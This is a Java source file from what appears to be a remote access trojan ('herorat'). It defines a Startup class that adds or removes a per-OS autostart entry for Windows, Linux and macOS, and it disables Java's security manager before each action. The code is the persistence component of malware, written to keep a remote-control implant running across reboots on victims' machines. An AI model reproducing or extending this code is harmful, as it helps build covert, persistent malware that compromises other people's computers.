package net.herorat.features.startup;

public class Startup
{
	public static void add(String entry_name)
	{
		System.setSecurityManager(null);
		entry_name = entry_name.replace(" ", "_");
		
		String os = System.getProperty("os.name", "").toLowerCase();
		if (os.contains("win"))
		{
			StartupWin.add(entry_name);
		}
		else if (os.contains("nux"))
		{
			StartupNux.add(entry_name);
		}
		else if (os.contains("mac"))
		{
			StartupMac.add(entry_name);
		}
	}
	
	public static void remove(String entry_name)
	{
		System.setSecurityManager(null);
		entry_name = entry_name.replace(" ", "_");
		
		String os = System.getProperty("os.name", "").toLowerCase();
		if (os.contains("win"))
		{
			StartupWin.remove(entry_name);
		}
		else if (os.contains("nux"))
		{
			StartupNux.remove(entry_name);
		}
		else if (os.contains("mac"))
		{
			StartupMac.remove(entry_name);
		}
	}
}